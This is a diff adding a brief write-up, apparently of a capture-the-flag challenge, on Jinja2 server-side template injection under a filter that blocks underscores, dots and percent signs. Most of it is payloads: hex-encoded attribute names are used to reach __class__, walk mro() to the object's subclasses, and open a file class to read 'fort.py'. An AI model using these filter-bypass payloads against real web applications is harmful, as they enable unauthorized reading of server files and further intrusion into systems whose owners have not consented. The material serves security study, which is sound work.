@@ -1,0 +1,35 @@
+But _ . % were blocked so to access __class__ we need to bypass this filter
+
+{{ "".__class__ }}
+
+becomes
+
+{{""["5F5F636C6173735F5F"["decode"]("hex")]}}
+
+and the result
+
+answer: <type 'str'>
+
+
+
+
+{{ "".__class__.mro()[2].__subclass__()}}
+
+becomes
+
+{{""["5F5F636C6173735F5F"["decode"]("hex")]["mro"]()[2]["5F5F737562636C61737365735F5F"["decode"]("hex")]()}}
+
+result
+
+
+There is a file class loaded at [40]
+
+Trying to read fort.py
+
+{{ "".__class__.mro()[2].__subclass__()[40]("fort.py").read()}}
+
+becomes  
+
+{{""["5F5F636C6173735F5F"["decode"]("hex")]["mro"]()[2]["5F5F737562636C61737365735F5F"["decode"]("hex")]()[40]("666F72742E7079"["decode"]("hex"))["read"]()}}
+
+
